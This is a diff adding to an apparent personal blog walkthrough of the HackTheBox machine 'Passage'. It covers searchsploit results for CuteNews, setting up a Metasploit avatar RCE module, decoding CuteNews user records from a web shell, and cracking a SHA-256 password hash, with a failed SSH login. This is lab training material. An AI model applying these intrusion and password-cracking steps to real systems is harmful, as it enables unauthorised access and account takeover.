@@ -3,6 +3,8 @@ layout: post
 title: HackTheBox Notes &mdash; Passage
 ---
 
+*WARNING: This is my first "hack"; as such, I change tack a couple of times, and it is messy...*
+
 This machine is currently active, and is my first attempt at HTB.  Its IP address is `10.10.10.206`.
 
 After pinging it, I have run
@@ -200,8 +202,263 @@ We see `paul` and `nadav` down there, as users already, but we do not have acces
 command > sudo useradd christopher 2>&1
 sudo: no tty present and no askpass program specified
 ```
-But it does not register our terminal very well (as the shell is minimal/bad).
+But it does not register our terminal very well (as the shell is minimal/bad).  We change tack: doing some more research I find a command line tool that makes exploiting in general easier.
 
 ---
 
-One big take-home message from this&emdash; my first HTB task&emdash; is: just Google!  Unless you think you have a great idea what to try, if you are only starting out
+We can check `exploit-db` again this time using `searchsploit`; a command line tool linked to that, and which makes *implementing* these exploitx easie.  Here is the output:
+```
+---------- ---------------------------------
+CuteNews - 'page' Local File Inclusion                                                                                                                                   | php/webapps/15208.txt
+CuteNews 0.88 - 'comments.php' Remote File Inclusion                                                                                                                     | php/webapps/22285.txt
+CuteNews 0.88 - 'search.php' Remote File Inclusion                                                                                                                       | php/webapps/22284.txt
+CuteNews 0.88 - 'shownews.php' Remote File Inclusion                                                                                                                     | php/webapps/22283.txt
+CuteNews 0.88/1.3 - 'example1.php' Cross-Site Scripting                                                                                                                  | php/webapps/24238.txt
+CuteNews 0.88/1.3 - 'example2.php' Cross-Site Scripting                                                                                                                  | php/webapps/24239.txt
+CuteNews 0.88/1.3 - 'show_archives.php' Cross-Site Scripting                                                                                                             | php/webapps/24240.txt
+CuteNews 0.88/1.3.x - 'index.php' Cross-Site Scripting                                                                                                                   | php/webapps/24566.txt
+CuteNews 1.1.1 - 'html.php' Remote Code Execution                                                                                                                        | php/webapps/4851.txt
+CuteNews 1.3 - Comment HTML Injection                                                                                                                                    | php/webapps/24290.txt
+CuteNews 1.3 - Debug Query Information Disclosure                                                                                                                        | php/webapps/23406.txt
+CuteNews 1.3.1 - 'show_archives.php' Cross-Site Scripting                                                                                                                | php/webapps/24372.txt
+CuteNews 1.3.6 - 'result' Cross-Site Scripting                                                                                                                           | php/webapps/29217.txt
+CuteNews 1.4.0 - Shell Injection / Remote Command Execution                                                                                                              | php/webapps/1221.php
+CuteNews 1.4.1 - 'categories.mdu' Remote Command Execution                                                                                                               | php/webapps/1400.pl
+CuteNews 1.4.1 - 'function.php' Local File Inclusion                                                                                                                     | php/webapps/1612.php
+CuteNews 1.4.1 - 'search.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                              | php/webapps/27819.txt
+CuteNews 1.4.1 - 'show_archives.php' Traversal Arbitrary File Access                                                                                                     | php/webapps/26465.txt
+CuteNews 1.4.1 - 'show_news.php' Cross-Site Scripting                                                                                                                    | php/webapps/27252.txt
+CuteNews 1.4.1 - 'template' Traversal Arbitrary File Access                                                                                                              | php/webapps/26466.txt
+CuteNews 1.4.1 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                           | php/webapps/27740.txt
+CuteNews 1.4.1 - Shell Injection / Remote Command Execution                                                                                                              | php/webapps/1289.php
+CuteNews 1.4.5 - 'rss_title' Cross-Site Scripting                                                                                                                        | php/webapps/29159.txt
+CuteNews 1.4.5 - 'show_news.php' Cross-Site Scripting                                                                                                                    | php/webapps/29158.txt
+CuteNews 1.4.5 - Admin Password md5 Hash Fetching                                                                                                                        | php/webapps/4779.php
+CuteNews 1.4.6 - 'from_date_day' Full Path Disclosure                                                                                                                    | php/webapps/33341.txt
+CuteNews 1.4.6 - 'index.php' Cross-Site Request Forgery (New User Creation)                                                                                              | php/webapps/33344.txt
+CuteNews 1.4.6 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                               | php/webapps/33340.txt
+CuteNews 1.4.6 - 'ip ban' Authorized Cross-Site Scripting / Command Execution                                                                                            | php/webapps/7700.php
+CuteNews 1.4.6 - 'result' Cross-Site Scripting                                                                                                                           | php/webapps/33343.txt
+CuteNews 1.4.6 - 'search.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                              | php/webapps/33342.txt
+CuteNews 1.4.6 editnews Module - doeditnews Action Admin Moderation Bypass                                                                                               | php/webapps/33345.txt
+CuteNews 2.0.3 - Arbitrary File Upload                                                                                                                                   | php/webapps/37474.txt
+CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                                                                                             | php/remote/46698.rb
+CuteNews 2.1.2 - Arbitrary File Deletion                                                                                                                                 | php/webapps/48447.txt
+CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                                                                                     | php/webapps/48458.txt
+CuteNews 2.1.2 - Remote Code Execution                                                                                                                                   | php/webapps/48800.py
+CuteNews aj-fork - 'path' Remote File Inclusion                                                                                                                          | php/webapps/32570.txt
+CuteNews aj-fork 167f - 'cutepath' Remote File Inclusion                                                                                                                 | php/webapps/2891.txt
+CuteNews and UTF-8 CuteNews - Multiple Vulnerabilities                                                                                                                   | php/webapps/10002.txt
+CutePHP CuteNews 1.3 - HTML Injection                                                                                                                                    | php/webapps/22842.txt
+CutePHP CuteNews 1.3.6 - 'x-forwarded-for' Script Injection                                                                                                              | php/webapps/25177.txt
+CutePHP CuteNews 1.4.1 - 'index.php' Cross-Site Scripting                                                                                                                | php/webapps/27356.txt
+CutePHP CuteNews 1.4.1 Editnews Module - Cross-Site Scripting                                                                                                            | php/webapps/27676.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results~
+```
+
+We see that there is an avatar remote code execution (RCE), which is always a good bet, so we download the application used to run this exploit:
+```bash
+┌──(kali㉿kali)-[~]
+└─$ searchsploit -m 46698.rb                                                                                                                                                                           2 ⚙
+  Exploit: CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)
+      URL: https://www.exploit-db.com/exploits/46698
+     Path: /usr/share/exploitdb/exploits/php/remote/46698.rb
+File Type: Ruby script, UTF-8 Unicode text, with CRLF line terminators
+
+Copied to: /home/kali/46698.rb
+```
+
+Now we can use metasploit (`msfconsole`) to run this:
+```
+$ msfconsole
+
+                                                                                                                           
+." @@@@@'.,'@@            @@@@@',.'@@@@ ".                                                                                                                                                                 
+'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;                                                                                                                                                                 
+   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'                                                                                                                                                                 
+     "--'.@@@  -.@        @ ,'-   .'--"                                                                                                                                                                    
+          ".@' ; @       @ `.  ;'                                                                                                                                                                          
+            |@@@@ @@@     @    .                                                                                                                                                                           
+             ' @@@ @@   @@    ,                                                                                                                                                                            
+              `.@@@@    @@   .                                                                                                                                                                             
+                ',@@     @   ;           _____________                                                                                                                                                     
+                 (   3 C    )     /|___ / Metasploit! \                                                                                                                                                    
+                 ;@'. __*__,."    \|--- \_____________/                                                                                                                                                    
+                  '(.,...."/                                                                                                                                                                               
+
+
+       =[ metasploit v6.0.15-dev                          ]
++ -- --=[ 2071 exploits - 1123 auxiliary - 352 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: View advanced module options with advanced
+
+msf6 >
+```
+
+There are some errors loading this module, which we check by checking the error log:
+```
+msf6 > cat ~/.msf4/logs/framework.log
+[*] exec: cat ~/.msf4/logs/framework.log
+
+[02/28/2021 18:38:19] [e(0)] core: Failed to connect to the database: No database YAML file
+[02/28/2021 18:38:20] [d(0)] core: Created user based module store
+[02/28/2021 18:38:27] [e(0)] core: Dependency for windows/x64/encrypted_shell_reverse_tcp is not supported
+[02/28/2021 18:38:27] [e(0)] core: Dependency for windows/encrypted_shell_reverse_tcp is not supported
+[02/28/2021 18:38:27] [e(0)] core: Dependency for windows/encrypted_reverse_tcp is not supported
+[02/28/2021 18:38:27] [e(0)] core: Dependency for windows/x64/encrypted_reverse_tcp is not supported
+```
+
+Okay, so we need to edit the module (`46698.rb`) that we got from `exploit-db`, so that it doesn't have any errors.  Touching up on our Ruby knowledge (which I've used a bit in the past, just for a simple PDF searcher), we need to edit the module in `def initializer` to stop these errors.  It is under this module that the errors are being thrown.
+
+All we needed to do was remove the `References` section to make it work.  
+
+We also need to change the login details:
+```ruby
+register_options(
+      [
+        OptString.new('TARGETURI', [true, "http://passage:80", '/CuteNews']),
+        OptString.new('USERNAME', [true, "Christopher Tatlock", 'admin']),
+        OptString.new('PASSWORD', [false, "W@ci5M%QS^Kr8x3ov7!7", 'admin'])
+      ]
+    )
+```
+
+Now restarting the Metasploit Framework Console, we see that is shows a different message:
+```
+$        
+
+                                                                                                                   
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                                                                                                                                                
+  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo                                                                                                                                                                
+  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx                                                                                                                                                                
+  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl                                                                                                                                                                
+  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.                                                                                                                                                                
+   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc                                                                                                                                                                 
+    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo                                                                                                                                                                  
+     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl                                                                                                                                                                   
+      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;                                                                                                                                                                    
+       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.                                                                                                                                                                     
+         ,kOl'M.OOOOOOOOOOOOO.M'dOk,                                                                                                                                                                       
+           :kk;.OOOOOOOOOOOOO.;Ok:                                                                                                                                                                         
+             ;kOOOOOOOOOOOOOOOk:                                                                                                                                                                           
+               ,xOOOOOOOOOOOx,                                                                                                                                                                             
+                 .lOOOOOOOl.                                                                                                                                                                               
+                    ,dOd,                                                                                                                                                                                  
+                      .                                                                                                                                                                                    
+
+       =[ metasploit v6.0.15-dev                          ]
++ -- --=[ 2071 exploits - 1123 auxiliary - 352 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: You can use help to view all available commands
+
+msf6 >
+```
+
+Now, I don't know much about web shells, but within this shell I can `ping` `passage`, which tells me it has access to my `hosts` file.  So I guess we need to get to the web shell we had previously (though, hoping this shell will give us access to a much better web shell).  To gain access to the machine again, after a little bit of research, I try
+
+
+Still not working, so I decided to put everything into a dedicated directory: `~/.msf6/exploit/cgi/webapps/46698.rb`.  Still not working, when I run `search 46698` inside the `msf6` shell.  `msf6` seems to be relatively new, and has slightly different functionality to `msf5`, so I might need to do some more research into this later.
+
+---
+
+I am going to try using that other PHP shell again.  It looks like my user was deleted previously, so I just add another user of the same credentials, and run `exploit.py` in the `testing` directory again.  
+
+Once in again, we notice that there is a directory in `/var` corresponding to the users of the `CuteNews` app: `/var/www/html/CuteNews/cdata/users/`.
+
+We run `ls` on this directory:
+```
+command > ls /var/www/html/CuteNews/cdata/users
+09.php
+0a.php
+0b.php
+16.php
+21.php
+22.php
+23.php
+2b.php
+31.php
+32.php
+39.php
+47.php
+52.php
+59.php
+5d.php
+5e.php
+65.php
+66.php
+6a.php
+6c.php
+6e.php
+75.php
+76.php
+77.php
+7a.php
+8b.php
+8f.php
+95.php
+97.php
+99.php
+a0.php
+a2.php
+a4.php
+aa.php
+b0.php
+c1.php
+c8.php
+d4.php
+d5.php
+d6.php
+e5.php
+f7.php
+fc.php
+lines
+users.txt
+```
+
+The `users.txt` seems empty, but we can check what's inside the `php` files:
+```
+command > cat /var/www/html/CuteNews/cdata/users/0b.php
+<?php die('Direct call - access denied'); ?>
+YToyOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoieTl3cW12djA0eiI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjE0NTUxMjUzIjtzOjQ6Im5hbWUiO3M6MTA6Ink5d3FtdnYwNHoiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTg6Ink5d3FtdnYwNHpAaGFjay5tZSI7czo0OiJuaWNrIjtzOjEwOiJ5OXdxbXZ2MDR6IjtzOjQ6InBhc3MiO3M6NjQ6IjJlMjM5YTAxNDk1MzhkZThhZjk1Mjk2MmFjODFiMjg5NDFkOWY1YTIyZWZkMmI3YWRiOTQ3NWFiODkzNDM2N2IiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czozMjoiYXZhdGFyX3k5d3FtdnYwNHpfeTl3cW12djA0ei5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX1zOjI6ImlkIjthOjE6e2k6MTYxNDU1MTkwNTtzOjEwOiJGQnd6YkhtejVXIjt9fQ==
+```
+
+Well that looks distinctly like `bashe64`!  And indeed, it is (though still obfuscated):
+```
+┌──(kali㉿kali)-[~]
+└─$ echo "YToyOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoieTl3cW12djA0eiI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjE0NTUxMjUzIjtzOjQ6Im5hbWUiO3M6MTA6Ink5d3FtdnYwNHoiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTg6Ink5d3FtdnYwNHpAaGFjay5tZSI7czo0OiJuaWNrIjtzOjEwOiJ5OXdxbXZ2MDR6IjtzOjQ6InBhc3MiO3M6NjQ6IjJlMjM5YTAxNDk1MzhkZThhZjk1Mjk2MmFjODFiMjg5NDFkOWY1YTIyZWZkMmI3YWRiOTQ3NWFiODkzNDM2N2IiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czozMjoiYXZhdGFyX3k5d3FtdnYwNHpfeTl3cW12djA0ei5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX1zOjI6ImlkIjthOjE6e2k6MTYxNDU1MTkwNTtzOjEwOiJGQnd6YkhtejVXIjt9fQ=="  | base64 -d
+a:2:{s:4:"name";a:1:{s:10:"y9wqmvv04z";a:9:{s:2:"id";s:10:"1614551253";s:4:"name";s:10:"y9wqmvv04z";s:3:"acl";s:1:"4";s:5:"email";s:18:"y9wqmvv04z@hack.me";s:4:"nick";s:10:"y9wqmvv04z";s:4:"pass";s:64:"2e239a0149538de8af952962ac81b28941d9f5a22efd2b7adb9475ab8934367b";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:32:"avatar_y9wqmvv04z_y9wqmvv04z.php";s:6:"e-hide";s:0:"";}}s:2:"id";a:1:{i:1614551905;s:10:"FBwzbHmz5W";}}
+```
+
+I think the thing of interest is after the `pass` field:
+```
+"2e239a0149538de8af952962ac81b28941d9f5a22efd2b7adb9475ab8934367b"
+```
+
+This looks like a hashed password, if ever I saw one!  But which hash?  Well, hopefully nothing too secure, as it is ultimately a machine that is made to be hacked.  Let's try an old one first: `SHA`.  We can try this [online](https://md5decrypt.net/en/Sha256/), but unfortunately `SHA-256` does not have a hash in the database.  We can try a different decryption method!  How about `md5`?  No luck with that.
+
+Okay, I have tried a bunch of those different files now, but nothing was coming up.  Until I trie Paul's file:
+```bash
+$ echo "YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19" | base64 -D
+a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
+```
+Indeed, I put his hash into `hash-identifier` and found that it was likely `SHA-256`.  Using an [online SHA-256 decoder using lookup tables](https://www.dcode.fr/sha256-hash) we find that this hashed password (`e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd`) corresponds to `atlanta1`.
+
+Now we need to access his account using the username `paul-coles` and the password `atlanta1`.
+
+I try ssh:
+```bash
+$ ssh paul-coles@10.10.10.206 -p 22
+paul-coles@10.10.10.206: Permission denied (publickey).
+```
+
+Hmm.  Stuck again.
+
+
+---
+
+One big take-home message from this&emdash; my first HTB task&mdash; is: just Google!  Unless you think you have a great idea what to try, if you are only starting out
